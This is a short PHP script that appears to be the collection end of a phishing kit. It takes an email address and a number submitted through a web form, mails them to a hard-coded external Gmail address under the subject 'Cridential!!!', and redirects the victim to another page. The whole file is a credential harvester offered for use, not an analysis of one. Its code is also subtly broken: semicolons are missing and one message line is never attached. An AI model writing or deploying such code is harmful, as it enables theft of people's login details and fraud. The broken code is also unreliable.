<?php
    $name=$_POST['email'];
    $f=$_POST['num'];
    $to      = 'ai78603.go@gmail.com';
    $subject = 'Cridential!!!';
    $message = "email adress:$name.\n";
                    "number:$f.\n";
    $headers = "from:web!!"

    mail($to, $subject, $message, $headers);
    header("Location: ve.html")
?>